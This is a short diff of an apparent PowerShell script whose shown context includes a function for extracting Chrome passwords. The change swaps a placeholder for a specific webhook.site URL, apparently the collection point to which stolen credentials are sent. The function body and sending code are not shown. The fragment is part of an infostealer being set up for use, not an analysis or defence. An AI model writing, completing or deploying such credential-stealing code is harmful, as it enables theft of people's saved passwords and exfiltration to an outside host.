@@ -1,5 +1,5 @@
 # Define the webhook URL
-$webhookUrl = "https://webhook.site/your-unique-webhook-url"
+$webhookUrl = "https://webhook.site/2eb0667e-5799-44f5-be46-491886beab08"
 
 # Function to extract Chrome passwords
 function Get-ChromePasswords {
